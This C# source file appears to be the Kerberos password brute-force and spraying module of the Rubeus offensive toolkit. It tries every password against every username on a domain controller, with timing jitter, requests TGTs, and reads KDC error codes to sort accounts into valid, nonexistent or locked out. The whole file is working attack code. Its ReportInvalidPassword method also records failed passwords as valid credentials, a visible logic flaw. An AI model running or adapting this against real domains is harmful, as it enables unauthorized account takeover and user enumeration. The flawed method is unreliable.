using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Xml;
using Rubeus.Domain;
using Rubeus.Kerberos;
using static Rubeus.Interop;

namespace Rubeus
{

    public interface IBruteforcerReporter
    {
        void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
        void ReportInvalidPassword(string domain, string username, string password);
        void ReportValidUser(string domain, string username);
        void ReportInvalidUser(string domain, string username);
        void ReportBlockedUser(string domain, string username);
        void ReportKrbError(string domain, string username, KRB_ERROR krbError);
    }


    public class Bruteforcer
    {

        private string domain;

        private string dc;
        private IBruteforcerReporter reporter;
        private Dictionary<string, bool> invalidUsers;
        private Dictionary<string, bool> validUsers;
        private Dictionary<string, string> validCredentials;

        public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)
        {
            this.domain = domain;
            this.dc = domainController;
            this.reporter = reporter;
            this.invalidUsers = new Dictionary<string, bool>();
            this.validUsers = new Dictionary<string, bool>();
            this.validCredentials = new Dictionary<string, string>();
        }

        public bool Attack(string[] usernames, string[] passwords, int delay, int jitter)
        {
            bool success = false;
            foreach (string password in passwords)
            {
                foreach (string username in usernames)
                {
                    if(this.TestUsernamePassword(username, password))
                    {
                        success = true;
                    }
                    Helpers.RandomDelayWithJitter(delay, jitter);
                }
            }

            return success;
        }

        public bool Attack_v2(string[] usernames, string[] passwords, string validusername, string validpassword, int delay, int jitter)
        {
            bool success = false;
            // check enctype first
            Interop.KERB_ETYPE enctype = CheckSupportedEtype(validusername, validpassword);
            if (enctype == Interop.KERB_ETYPE.old_exp)
            {
                Console.WriteLine("[!] Error: No supported encryption type found!");
                return false;
            }

            foreach (string password in passwords)
            {
                foreach (string username in usernames)
                {
                    if (this.TestUsernamePassword_v2(username, password, enctype))
                    {
                        success = true;
                    }
                    Helpers.RandomDelayWithJitter(delay, jitter);
                }
            }

            return success;
        }

        private bool TestUsernamePassword(string username, string password)
        {
            try
            {
                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                {
                    this.GetUsernamePasswordTGT(username, password);
                    return true;
                }
            }
            catch (KerberosErrorException ex)
            {
                return this.HandleKerberosError(ex, username, password);
            }

            return false;
        }
        private bool TestUsernamePassword_v2(string username, string password, Interop.KERB_ETYPE enctype)
        {
            try
            {
                if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                {
                    this.GetUsernamePasswordTGT_v2(username, password, enctype);
                    return true;
                }
            }
            catch (KerberosErrorException ex)
            {
                return this.HandleKerberosError(ex, username, password);
            }

            return false;
        }


        private void GetUsernamePasswordTGT(string username, string password)
        {
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            string salt = String.Format("{0}{1}", domain.ToUpper(), username);

            // special case for computer account salts
            if (username.EndsWith("$"))
            {
                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
            }

            string hash = Crypto.KerberosPasswordHash(encType, password, salt);

            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);

            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);

            this.ReportValidPassword(username, password, TGT);
        }

        private void GetUsernamePasswordTGT_v2(string username, string password, Interop.KERB_ETYPE encType)
        {
            bool login = false;
            byte[] TGT = null;

            try
            {
                Console.WriteLine($"[*] Using domain controller: {this.dc}");
                Console.WriteLine($"[*] Trying encryption type: {encType}");

                string salt = String.Format("{0}{1}", domain.ToUpper(), username);

                // Special case for computer account salts
                if (username.EndsWith("$"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
                }

                string hash = Crypto.KerberosPasswordHash(encType, password, salt);

                AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);


                TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
                if (TGT == null || TGT.Length == 0)
                {
                    Console.WriteLine($"Encryption type {encType} did not return a valid TGT.");
                }
                else
                {
                    Console.WriteLine($"Encryption type {encType} is supported.");
                    login = true;
                }
            }
            catch (KerberosErrorException kex)
            {

                KRB_ERROR error = kex.krbError;
                try
                {
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                    if (error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
                    {
                        PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
                        Console.WriteLine("[*] {0} is superseded by {1}", username, obj.name.name_string[0]);
                    }

                }
                catch
                {
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }

            if (login)
            {
                this.ReportValidPassword(username, password, TGT);
            }
            else
            {
                this.ReportInvalidPassword(username, password);
            }
        }

        private Interop.KERB_ETYPE CheckSupportedEtype(string username, string password)
        {
            // List all possible encryption types you want to check
            var encTypes = new[]
            {
                Interop.KERB_ETYPE.rc4_hmac,
                Interop.KERB_ETYPE.aes128_cts_hmac_sha1,
                Interop.KERB_ETYPE.aes256_cts_hmac_sha1,
                Interop.KERB_ETYPE.des_cbc_crc,
                Interop.KERB_ETYPE.des_cbc_md4,
                Interop.KERB_ETYPE.des_cbc_md5,
                Interop.KERB_ETYPE.des3_cbc_md5,
                Interop.KERB_ETYPE.des3_cbc_sha1,
                Interop.KERB_ETYPE.des3_cbc_sha1_kd
                // Add more as needed
            };
            byte[] TGT = null;

            foreach (var encType in encTypes)
            {
                try
                {
                    Console.WriteLine($"[*] Using domain controller: {this.dc}");
                    Console.WriteLine($"[*] Trying encryption type: {encType}");

                    string salt = String.Format("{0}{1}", domain.ToUpper(), username);

                    // Special case for computer account salts
                    if (username.EndsWith("$"))
                    {
                        salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
                    }

                    string hash = Crypto.KerberosPasswordHash(encType, password, salt);

                    AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);


                    TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
                    if (TGT == null || TGT.Length == 0)
                    {
                        Console.WriteLine($"Encryption type {encType} did not return a valid TGT.");
                    }
                    else
                    {
                        Console.WriteLine($"Encryption type {encType} is supported.");
                        return encType;
                    }
                }
                catch (KerberosErrorException kex)
                {

                    KRB_ERROR error = kex.krbError;
                    try
                    {
                        Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                        if (error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
                        {
                            PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
                            Console.WriteLine("[*] {0} is superseded by {1}", username, obj.name.name_string[0]);
                        }

                    }
                    catch
                    {
                        Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                    }
                }
            }
            return Interop.KERB_ETYPE.old_exp;
        }


        private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
        {
            

            KRB_ERROR krbError = ex.krbError;
            bool ret = false;

            switch ((Interop.KERBEROS_ERROR)krbError.error_code)
            {
                case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                    this.ReportValidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    this.ReportInvalidUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                    this.ReportBlockedUser(username);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
                    this.ReportInvalidEncryptionType(username, krbError);
                    break;
                case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
                    ret = true;
                    break;
                default:
                    this.ReportKrbError(username, krbError);
                    throw ex;
            }
            return ret;
        }

        private void ReportValidPassword(string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            this.reporter.ReportValidPassword(this.domain, username, password, ticket, err);
        }

        private void ReportValidUser(string username)
        {
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
                this.reporter.ReportValidUser(this.domain, username);
            }
        }

        private void ReportInvalidUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportInvalidUser(this.domain, username);
            }
        }

        private void ReportBlockedUser(string username)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.reporter.ReportBlockedUser(this.domain, username);
            }
        }

        private void ReportInvalidEncryptionType(string username, KRB_ERROR krbError)
        {
            if (!invalidUsers.ContainsKey(username))
            {
                invalidUsers.Add(username, true);
                this.ReportKrbError(username, krbError);
            }
        }

        private void ReportKrbError(string username, KRB_ERROR krbError)
        {
            this.reporter.ReportKrbError(this.domain, username, krbError);
        }

        private void ReportInvalidPassword(string username, string password)
        {

            validCredentials.Add(username, password);
            if (!validUsers.ContainsKey(username))
            {
                validUsers.Add(username, true);
            }
            this.reporter.ReportInvalidPassword(this.domain, username, password);
        }



    }
}
